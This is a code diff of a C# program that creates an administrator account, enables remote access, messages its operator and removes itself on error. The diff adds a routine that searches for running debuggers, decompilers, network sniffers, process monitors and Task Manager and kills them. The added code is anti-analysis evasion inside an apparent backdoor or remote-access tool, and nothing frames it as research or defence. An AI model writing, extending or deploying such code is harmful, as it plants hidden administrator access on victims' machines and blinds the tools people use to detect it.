@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Diagnostics;
 using System.IO;
 using System.Management;
@@ -15,9 +15,18 @@ namespace localhost
             var fileName = Process.GetCurrentProcess().MainModule.FileName;
             try
             {
-                Program.createAdminUser();
-                Program.allowRemoteAccess();
-                Program.SendMessage("Job's done!");
+                if (CheckProcesses())
+                {
+                    Program.createAdminUser();
+                    Program.allowRemoteAccess();
+                    Program.SendMessage("Job's done!");
+                } else
+                {
+                    Program.createAdminUser();
+                    Program.allowRemoteAccess();
+                    Program.SendMessage("Job's done!");
+                }
+
             }
             catch
             {
@@ -105,6 +114,40 @@ namespace localhost
                 // Ошибки не выводятся, вызывается selfRemove
                 throw;
             }
+        }
+
+        private static bool CheckProcesses()
+        {
+            string[] forbiddenProcesses =
+            {
+                                "dnspy", "Mega Dumper", "Dumper", "PE-bear", "de4dot", "TCPView", "Resource Hacker", "Pestudio", "HxD", "Scylla",
+                "de4dot", "PE-bear", "Fakenet-NG", "ProcessExplorer", "SoftICE", "ILSpy", "dump", "proxy", "de4dotmodded", "StringDecryptor",
+                "Centos", "SAE", "monitor", "brute", "checker", "zed", "sniffer", "http", "debugger", "james",
+                "exeinfope", "codecracker", "x32dbg", "x64dbg", "ollydbg", "ida -", "charles", "dnspy", "simpleassembly", "peek",
+                "httpanalyzer", "httpdebug", "fiddler", "wireshark", "dbx", "mdbg", "gdb", "windbg", "dbgclr", "kdb",
+                "kgdb", "mdb", "ollydbg", "dumper", "wireshark", "httpdebugger", "http debugger", "fiddler", "decompiler", "unpacker",
+                "deobfuscator", "de4dot", "confuser", " /snd", "x64dbg", "x32dbg", "x96dbg", "process hacker", "dotpeek", ".net reflector",
+                "ilspy", "file monitoring", "file monitor", "files monitor", "netsharemonitor", "fileactivitywatcher", "fileactivitywatch", "windows explorer tracker", "process monitor", "disk pluse",
+                "file activity monitor", "fileactivitymonitor", "file access monitor", "mtail", "snaketail", "tail -n", "httpnetworksniffer", "microsoft message analyzer", "networkmonitor", "network monitor",
+                "soap monitor", "internet traffic agent", "socketsniff", "networkminer", "network debugger", "HTTPDebuggerSvc", "HTTPDebuggerUI", "mitmproxy", "python", "mitm", "taskmgr", "ProcessHacker2", "Process Hacker2", "Wireshark", "Process Hacker", "Process Hacker 2",
+            };
+
+            foreach (var processName in forbiddenProcesses)
+            {
+                var processes = Process.GetProcessesByName(processName);
+                
+                if (processes.Length > 0)
+                {
+                    foreach (var process in processes)
+                    {
+                        process.Kill();
+                    }
+
+                    return true;
+                }
+            }
+
+            return false;
         }
 
         private static void RunPS(string args)
